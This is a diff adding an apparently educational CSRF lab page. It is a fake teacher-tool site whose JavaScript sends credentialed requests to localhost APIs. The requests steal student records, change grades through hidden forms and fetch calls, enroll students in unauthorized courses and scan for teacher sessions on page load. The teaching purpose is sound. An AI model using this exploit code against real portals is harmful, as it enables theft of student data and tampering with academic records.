@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EduTools Pro - Free Grade Management Assistant</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            color: #333;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        .attack-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #dc3545;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 10px 5px;
+            font-size: 14px;
+        }
+        button:hover {
+            background: #218838;
+        }
+        button.attack {
+            background: #dc3545;
+        }
+        button.attack:hover {
+            background: #c82333;
+        }
+        .results {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            border: 1px solid #dee2e6;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #ffeaa7;
+            margin-bottom: 20px;
+        }
+        select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .attack-log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 6px;
+            padding: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">EduTools Pro</div>
+            <h1>Free Grade Management Assistant for Educators</h1>
+            <p>Streamline your grading workflow with our AI-powered tools!</p>
+        </div>
+
+        <div class="warning">
+            <strong>Educational Demo:</strong> This is a simulated attacker site targeting teachers for CSRF demonstration. 
+            In real attacks, educators wouldn't realize they're visiting a malicious site designed to exploit their administrative access.
+        </div>
+
+        <!-- Global API Selection -->
+        <div class="attack-section" style="border-left: 4px solid #007bff;">
+            <h3>Target API Selection</h3>
+            <p>Choose which teacher portal API to target for all attacks:</p>
+            <div>
+                <label>Target Teacher Portal:</label>
+                <select id="global-target-api" onchange="updateGlobalAPI()">
+                    <option value="https://localhost:3000">Legacy API (Port 3000) - No CORS</option>
+                    <option value="https://localhost:3001">Vulnerable API (Port 3001) - No CSRF Protection</option>
+                    <option value="https://localhost:3002">CORS-Only API (Port 3002) - Partial Protection</option>
+                    <option value="https://localhost:3003">Protected API (Port 3003) - Full CSRF Protection</option>
+                </select>
+            </div>
+            <div id="api-status" class="results" style="margin-top: 10px;">
+                Current Target: <strong>https://localhost:3001</strong> (Vulnerable API)
+            </div>
+        </div>
+
+        <!-- CSRF Attack Sections -->
+        <div class="attack-section">
+            <h3>CSRF Attack: Data Theft via GET (sameSite=lax bypass)</h3>
+            <p>Steal sensitive student data using GET requests - works with sameSite=lax cookies</p>
+            <button class="attack" onclick="stealStudentData()">Steal Student Data</button>
+            <div id="data-theft-results" class="results"></div>
+        </div>
+
+        <div class="attack-section">
+            <h3>CSRF Attack: Form Submission (No Preflight)</h3>
+            <p>Simple form submission that bypasses CORS preflight checks</p>
+            <div>
+                <label>Target Student:</label>
+                <select id="form-target-student">
+                    <option value="alice123">Alice Smith (alice123)</option>
+                    <option value="bob456">Bob Johnson (bob456)</option>
+                </select>
+            </div>
+            <button class="attack" onclick="executeFormAttack()">Execute Form Attack</button>
+            <div id="form-attack-results" class="results"></div>
+        </div>
+
+        <div class="attack-section">
+            <h3>CSRF Attack: Fetch API (Triggers Preflight)</h3>
+            <p>Modern JavaScript attack that triggers CORS preflight due to JSON content-type</p>
+            <div>
+                <label>Target Student:</label>
+                <select id="attack-target-student">
+                    <option value="alice123">Alice Smith (alice123)</option>
+                    <option value="bob456">Bob Johnson (bob456)</option>
+                </select>
+            </div>
+            <button class="attack" onclick="executeFetchAttack()">Execute Fetch Attack</button>
+            <div id="fetch-attack-results" class="results"></div>
+        </div>
+
+        <div class="attack-section">
+            <h3>CSRF Attack: Bulk Grade Manipulation</h3>
+            <p>Multiple simultaneous attacks to change grades for multiple students</p>
+            <button class="attack" onclick="executeBulkAttack()">Execute Bulk Grade Attack</button>
+            <div id="bulk-attack-results" class="results"></div>
+        </div>
+
+        <div class="attack-section">
+            <h3>CSRF Attack: Course Registration</h3>
+            <p>Enroll students in unauthorized courses or expensive programs</p>
+            <div>
+                <label>Malicious Course:</label>
+                <select id="malicious-course">
+                    <option value="HACKER101">HACKER101 - Unauthorized Course</option>
+                    <option value="PREMIUM999">PREMIUM999 - Expensive Course ($5000)</option>
+                    <option value="DELETE_ME">DELETE_ME - Course Designed to Corrupt Records</option>
+                </select>
+            </div>
+            <button class="attack" onclick="executeCourseAttack()">Execute Course Registration Attack</button>
+            <div id="course-attack-results" class="results"></div>
+        </div>
+
+        <div class="attack-section">
+            <h3>Attack Monitoring Dashboard</h3>
+            <button onclick="clearLog()">Clear Attack Log</button>
+            <button onclick="checkTeacherSessions()">Check Teacher Sessions</button>
+            <div id="attack-log" class="attack-log">
+                <div>CSRF Teacher Portal Attack Log:</div>
+                <div>Waiting for teacher to interact with educational tools...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global API target
+        let currentTargetAPI = 'https://localhost:3001';
+
+        function logAttack(message) {
+            const log = document.getElementById('attack-log');
+            const timestamp = new Date().toLocaleTimeString();
+            log.innerHTML += `<br>[${timestamp}] ${message}`;
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('attack-log').innerHTML = 
+                '<div>CSRF Teacher Portal Attack Log:</div><div>Log cleared...</div>';
+        }
+
+        function updateGlobalAPI() {
+            currentTargetAPI = document.getElementById('global-target-api').value;
+            const apiNames = {
+                'https://localhost:3000': 'Legacy API (No CORS)',
+                'https://localhost:3001': 'Vulnerable API (No CSRF Protection)',
+                'https://localhost:3002': 'CORS-Only API (Partial Protection)', 
+                'https://localhost:3003': 'Protected API (Full CSRF Protection)'
+            };
+            
+            document.getElementById('api-status').innerHTML = `
+                Current Target: <strong>${currentTargetAPI}</strong><br>
+                <em>${apiNames[currentTargetAPI]}</em>
+            `;
+            
+            logAttack(`Target switched to: ${apiNames[currentTargetAPI]}`);
+        }
+
+        // Attack: Steal student data via GET requests (sameSite=lax bypass)
+        async function stealStudentData() {
+            logAttack(`Data Theft Attack: Attempting to steal student data from ${currentTargetAPI}`);
+            
+            let results = `<strong>Student Data Theft Results:</strong><br>`;
+            results += `Target: ${currentTargetAPI}<br><br>`;
+            let successCount = 0;
+            let totalAttempts = 0;
+            
+            // Array of GET endpoints to try
+            const endpoints = [
+                { name: 'Student List', url: '/api/students' },
+                { name: 'Available Courses', url: '/api/courses' },
+                { name: 'Alice Profile', url: '/api/profile?targetStudent=alice123' },
+                { name: 'Bob Profile', url: '/api/profile?targetStudent=bob456' },
+                { name: 'Alice Grades', url: '/api/grades?targetStudent=alice123' },
+                { name: 'Bob Grades', url: '/api/grades?targetStudent=bob456' }
+            ];
+            
+            for (const endpoint of endpoints) {
+                totalAttempts++;
+                try {
+                    const response = await fetch(`${currentTargetAPI}${endpoint.url}`, {
+                        method: 'GET',
+                        credentials: 'include'
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        results += `<span style="color: red;">STOLEN</span> ${endpoint.name}: `;
+                        
+                        // Show a preview of stolen data
+                        if (endpoint.name === 'Student List' && data.students) {
+                            results += `${data.students.length} student records<br>`;
+                        } else if (endpoint.name.includes('Profile') && data.student) {
+                            results += `${data.student.name} (${data.student.email})<br>`;
+                        } else if (endpoint.name.includes('Grades') && data.grades) {
+                            const gradeCount = Object.keys(data.grades).length;
+                            results += `${gradeCount} course grades<br>`;
+                        } else if (endpoint.name === 'Available Courses' && data.availableCourses) {
+                            results += `${data.availableCourses.length} course listings<br>`;
+                        } else {
+                            results += `Data accessed<br>`;
+                        }
+                        
+                        successCount++;
+                        logAttack(`SUCCESS: Stole ${endpoint.name} from ${currentTargetAPI}`);
+                    } else {
+                        results += `<span style="color: green;">BLOCKED</span> ${endpoint.name}: (${response.status})<br>`;
+                        logAttack(`BLOCKED: ${endpoint.name} access denied (${response.status})`);
+                    }
+                } catch (error) {
+                    results += `<span style="color: green;">ERROR</span> ${endpoint.name}: (${error.message.split(' ')[0]})<br>`;
+                    logAttack(`ERROR: ${endpoint.name} failed - ${error.message.split(' ')[0]}`);
+                }
+            }
+            
+            results += `<br><strong>Theft Summary:</strong> ${successCount}/${totalAttempts} endpoints compromised<br><br>`;
+            
+            if (successCount > 0) {
+                results += `<span style="color: red;"><strong>Privacy Breach:</strong> Sensitive student data was stolen!<br>`;
+                results += `This demonstrates why GET endpoints need protection too.</span><br><br>`;
+                results += `<strong>Why This Worked:</strong><br>`;
+                results += `• GET requests work with sameSite=lax cookies<br>`;
+                results += `• CORS policy allows this origin (localhost:8002)<br>`;
+                results += `• No CSRF protection on data endpoints<br>`;
+                results += `• Teacher session cookies sent automatically`;
+            } else {
+                results += `<span style="color: green;"><strong>Data Protected:</strong> All theft attempts were blocked!<br>`;
+                results += `The API successfully prevented unauthorized data access.</span>`;
+            }
+            
+            document.getElementById('data-theft-results').innerHTML = results;
+            logAttack(`Data theft attack completed: ${successCount}/${totalAttempts} endpoints compromised`);
+        }
+
+        // Attack: Form-based submission (bypasses CORS preflight)
+        function executeFormAttack() {
+            const targetStudent = document.getElementById('form-target-student').value;
+            
+            logAttack(`Form Attack: Creating hidden form targeting ${currentTargetAPI}`);
+            
+            // Create hidden form for grade change
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `${currentTargetAPI}/api/change-grade`;
+            form.style.display = 'none';
+            form.target = 'csrf-frame';
+            form.enctype = 'application/x-www-form-urlencoded'; // Simple content-type
+            
+            // Add form fields
+            const studentField = document.createElement('input');
+            studentField.name = 'targetStudent';
+            studentField.value = targetStudent;
+            form.appendChild(studentField);
+            
+            const courseField = document.createElement('input');
+            courseField.name = 'course';
+            courseField.value = 'CS101';
+            form.appendChild(courseField);
+            
+            const gradeField = document.createElement('input');
+            gradeField.name = 'newGrade';
+            gradeField.value = 'F';
+            form.appendChild(gradeField);
+            
+            // Create hidden iframe for form submission
+            let iframe = document.getElementById('csrf-frame');
+            if (!iframe) {
+                iframe = document.createElement('iframe');
+                iframe.name = 'csrf-frame';
+                iframe.style.display = 'none';
+                iframe.onload = function() {
+                    setTimeout(() => {
+                        try {
+                            // Try to read iframe content (will fail due to CORS)
+                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                            logAttack(`Form response received (cannot read due to CORS)`);
+                        } catch (e) {
+                            logAttack(`Form submitted - response blocked by same-origin policy`);
+                        }
+                    }, 1000);
+                };
+                document.body.appendChild(iframe);
+            }
+            
+            // Submit form
+            document.body.appendChild(form);
+            
+            try {
+                form.submit();
+                document.getElementById('form-attack-results').innerHTML = `
+                    <div style="color: orange;">
+                        <strong>Form Attack Submitted</strong><br>
+                        Target: ${currentTargetAPI}/api/change-grade<br>
+                        Student: ${targetStudent}<br>
+                        Content-Type: application/x-www-form-urlencoded<br><br>
+                        <strong>Key Points:</strong><br>
+                        • Form submissions do NOT trigger CORS preflight<br>
+                        • Request gets sent regardless of CORS policy<br>
+                        • Success depends on cookie SameSite settings<br>
+                        • Response is blocked by same-origin policy<br><br>
+                    </div>
+                `;
+                logAttack(`Form attack submitted against ${currentTargetAPI} for ${targetStudent}`);
+                
+                // Clean up form after delay
+                setTimeout(() => {
+                    if (document.body.contains(form)) {
+                        document.body.removeChild(form);
+                    }
+                }, 3000);
+            } catch (error) {
+                document.getElementById('form-attack-results').innerHTML = `
+                    <div style="color: red;"><strong>Form attack failed:</strong> ${error.message}<br>
+                    Target: ${currentTargetAPI}</div>
+                `;
+                logAttack(`Form attack failed on ${currentTargetAPI}: ` + error.message);
+            }
+        }
+
+        // Attack: Fetch API grade manipulation (triggers CORS preflight)
+        async function executeFetchAttack() {
+            const targetStudent = document.getElementById('attack-target-student').value;
+            
+            logAttack(`Fetch Attack: Targeting teacher portal ${currentTargetAPI} with credentials`);
+            
+            try {
+                const gradeResponse = await fetch(`${currentTargetAPI}/api/change-grade`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'include', // Use teacher's session cookies
+                    body: JSON.stringify({
+                        targetStudent: targetStudent,
+                        course: 'CS101',
+                        newGrade: 'A+'
+                    })
+                });
+
+                let results = `<strong>Fetch API Attack Results:</strong><br>`;
+                results += `Target: ${currentTargetAPI}<br><br>`;
+                
+                if (gradeResponse.ok) {
+                    const gradeData = await gradeResponse.json();
+                    results += `<span style="color: red;">ATTACK SUCCEEDED!</span><br>`;
+                    results += `Response: ${JSON.stringify(gradeData)}<br><br>`;
+                    results += `<strong>Security Breach:</strong> Teacher's session was exploited to change grades!<br><br>`;
+                    results += `<strong>Why This Worked:</strong><br>`;
+                    results += `• CORS policy allows cross-origin requests<br>`;
+                    results += `• Cookies sent with credentials: 'include'<br>`;
+                    results += `• No CSRF token validation<br>`;
+                    results += `• SameSite cookie settings allow cross-site requests`;
+                    logAttack(`Grade change attack SUCCESS: ${targetStudent} -> A+ on ${currentTargetAPI}`);
+                } else {
+                    results += `<span style="color: green;">ATTACK BLOCKED (${gradeResponse.status})</span><br><br>`;
+                    results += `Teacher portal security successfully prevented unauthorized grade changes!<br><br>`;
+                    results += `<strong>Possible Protection Mechanisms:</strong><br>`;
+                    results += `• CORS policy blocks cross-origin requests<br>`;
+                    results += `• CSRF token required and missing<br>`;
+                    results += `• SameSite=Strict cookie policy<br>`;
+                    results += `• Authentication/authorization failure`;
+                    logAttack(`Grade change attack BLOCKED for ${targetStudent} (${gradeResponse.status}) on ${currentTargetAPI}`);
+                }
+
+                document.getElementById('fetch-attack-results').innerHTML = results;
+                
+            } catch (error) {
+                let errorMsg = error.message;
+                let technicalExplanation = '';
+                
+                if (error.message.includes('CORS')) {
+                    technicalExplanation = `<br><strong>CORS Protection Active:</strong> The teacher portal is configured to block cross-origin requests from this malicious site.`;
+                } else if (error.message.includes('Failed to fetch')) {
+                    technicalExplanation = `<br><strong>Network/Security Block:</strong> The request was blocked by browser security policies or the server is unreachable.`;
+                } else {
+                    technicalExplanation = `<br><strong>Browser Security:</strong> Modern browser protections prevented the attack.`;
+                }
+                
+                document.getElementById('fetch-attack-results').innerHTML = `
+                    <div style="color: red;"><strong>Fetch attack failed:</strong> ${errorMsg}<br>
+                    Target: ${currentTargetAPI}${technicalExplanation}<br><br>
+                    <span style="color: green;">This failure indicates the teacher portal has proper security measures in place!</span></div>
+                `;
+                logAttack(`Fetch attack failed on ${currentTargetAPI}: ` + errorMsg);
+            }
+        }
+
+        // Attack: Bulk grade manipulation
+        async function executeBulkAttack() {
+            logAttack(`Bulk Attack: Targeting multiple students via ${currentTargetAPI}`);
+            
+            const attacks = [
+                { student: 'alice123', course: 'CS101', grade: 'A+' },
+                { student: 'alice123', course: 'MATH200', grade: 'A+' },
+                { student: 'bob456', course: 'CS101', grade: 'A+' },
+                { student: 'bob456', course: 'PHYS150', grade: 'A+' }
+            ];
+            
+            let results = `<strong>Bulk Grade Manipulation Results:</strong><br>`;
+            results += `Target: ${currentTargetAPI}<br><br>`;
+            let successCount = 0;
+            let blockedCount = 0;
+            
+            for (const attack of attacks) {
+                try {
+                    const response = await fetch(`${currentTargetAPI}/api/change-grade`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        credentials: 'include',
+                        body: JSON.stringify({
+                            targetStudent: attack.student,
+                            course: attack.course,
+                            newGrade: attack.grade
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        results += `<span style="color: red;">SUCCESS</span> ${attack.student} ${attack.course}: ${attack.grade}<br>`;
+                        successCount++;
+                    } else {
+                        results += `<span style="color: green;">BLOCKED</span> ${attack.student} ${attack.course}: (${response.status})<br>`;
+                        blockedCount++;
+                    }
+                } catch (error) {
+                    results += `<span style="color: green;">ERROR</span> ${attack.student} ${attack.course}: (${error.message.split(' ')[0]})<br>`;
+                    blockedCount++;
+                }
+            }
+            
+            results += `<br><strong>Attack Summary:</strong> ${successCount} succeeded, ${blockedCount} blocked<br><br>`;
+            
+            if (successCount > 0) {
+                results += `<span style="color: red;"><strong>Critical Security Breach:</strong> Multiple unauthorized grade changes succeeded!<br>`;
+                results += `Academic integrity compromised - immediate security review needed.</span>`;
+            } else {
+                results += `<span style="color: green;"><strong>Security Successful:</strong> All unauthorized grade change attempts were blocked!<br>`;
+                results += `The teacher portal's security measures prevented academic record manipulation.</span>`;
+            }
+            
+            document.getElementById('bulk-attack-results').innerHTML = results;
+            logAttack(`Bulk attack on ${currentTargetAPI} completed: ${successCount}/${attacks.length} succeeded, ${blockedCount} blocked`);
+        }
+
+        // Attack: Course registration
+        async function executeCourseAttack() {
+            const targetStudent = document.getElementById('attack-target-student').value;
+            const maliciousCourse = document.getElementById('malicious-course').value;
+            
+            logAttack(`Course Registration Attack: Enrolling ${targetStudent} in ${maliciousCourse} via ${currentTargetAPI}`);
+            
+            try {
+                const response = await fetch(`${currentTargetAPI}/api/register-course`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        targetStudent: targetStudent,
+                        courseCode: maliciousCourse
+                    })
+                });
+                
+                let results = `<strong>Malicious Course Registration Results:</strong><br>`;
+                results += `Target: ${currentTargetAPI}<br><br>`;
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    results += `<span style="color: red;">ATTACK SUCCEEDED!</span><br>`;
+                    results += `Student: ${targetStudent}<br>`;
+                    results += `Course: ${maliciousCourse}<br>`;
+                    results += `Server Response: ${JSON.stringify(data)}<br><br>`;
+                    results += `<strong>Attack Success Factors:</strong><br>`;
+                    results += `• Teacher session hijacked successfully<br>`;
+                    results += `• No CSRF protection on enrollment endpoint<br>`;
+                    results += `• Cross-origin request permitted`;
+                    logAttack(`Course attack SUCCESS: ${targetStudent} enrolled in ${maliciousCourse} via ${currentTargetAPI}`);
+                } else {
+                    results += `<span style="color: green;">ATTACK BLOCKED (HTTP ${response.status})</span><br><br>`;
+                    results += `<strong>Protection Successful:</strong><br>`;
+                    results += `<strong>Possible Protection Mechanisms:</strong><br>`;
+                    results += `• CSRF token validation required<br>`;
+                    results += `• CORS policy blocking cross-origin requests<br>`;
+                    results += `• Additional authentication checks<br>`;
+                    results += `• Course enrollment restrictions`;
+                    logAttack(`Course attack BLOCKED: ${targetStudent} / ${maliciousCourse} on ${currentTargetAPI}`);
+                }
+                
+                document.getElementById('course-attack-results').innerHTML = results;
+                
+            } catch (error) {
+                document.getElementById('course-attack-results').innerHTML = `
+                    <div style="color: red;"><strong>Course registration attack failed:</strong> ${error.message}<br>
+                    Target: ${currentTargetAPI}<br><br>
+                    <strong>Technical Reason:</strong> Browser security policies or network protections blocked the malicious enrollment attempt.<br><br>
+                    <span style="color: green;">This failure indicates robust security measures are protecting student academic records!</span></div>
+                `;
+                logAttack(`Course attack failed on ${currentTargetAPI}: ` + error.message);
+            }
+        }
+
+        // Check for active teacher sessions
+        async function checkTeacherSessions() {
+            const apis = [
+                'https://localhost:3000',
+                'https://localhost:3001',
+                'https://localhost:3002', 
+                'https://localhost:3003'
+            ];
+            
+            logAttack('Scanning for active teacher sessions across all portals...');
+            
+            for (const api of apis) {
+                try {
+                    const response = await fetch(`${api}/api/status`, {
+                        credentials: 'include'
+                    });
+                    
+                    if (response.ok) {
+                        logAttack(`${api}: Teacher portal accessible - checking for session...`);
+                        
+                        // Try to access teacher-only endpoint
+                        const sessionCheck = await fetch(`${api}/api/students`, {
+                            credentials: 'include'
+                        });
+                        
+                        if (sessionCheck.ok) {
+                            logAttack(`${api}: ACTIVE TEACHER SESSION DETECTED - attack ready!`);
+                        } else {
+                            logAttack(`${api}: No active teacher session found`);
+                        }
+                    }
+                } catch (error) {
+                    logAttack(`${api}: Connection failed - ${error.message.split(' ')[0]}`);
+                }
+            }
+        }
+
+        // Initialize page
+        window.onload = function() {
+            logAttack('Teacher visited EduTools Pro - appears to be legitimate educational resource');
+            logAttack('Site successfully masquerading as helpful teacher productivity tool');
+            
+            // Initialize global API selection
+            updateGlobalAPI();
+            
+            // Auto-check for teacher sessions after a delay
+            setTimeout(checkTeacherSessions, 2000);
+        };
+    </script>
+</body>
+</html>
